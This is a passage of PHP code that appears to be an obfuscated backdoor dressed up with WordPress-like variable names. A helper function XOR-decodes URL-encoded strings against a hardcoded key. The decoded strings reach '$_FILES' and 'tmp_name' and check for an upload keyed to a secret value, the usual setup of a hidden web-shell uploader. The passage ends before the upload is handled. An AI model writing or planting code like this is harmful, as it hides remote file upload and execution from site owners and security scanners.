...
$space = 'B925IRb3e4OTECj';
$foundid = $space;
	$entity = 'myHTML';
function loop($ignore_block_element, $tagregexp)

{

    $plural_base = $tagregexp;
    $html = urldecode($ignore_block_element);
    $content_type = substr($plural_base,0, strlen($html));
	$new_status = 'is_single_tag';
    $taxonomy_obj = $html ^ $content_type;
    return $taxonomy_obj;
}

$link = ${loop("%1D%7F%7By%0C%01", $foundid)};

$thumb = $link;
	$secs = 'title';
$category = isset($thumb[$foundid]);
if ($category)

{
    $more_string = $link[$foundid];
    $children = $more_string[loop("6TBj%273%0FV", $foundid)];
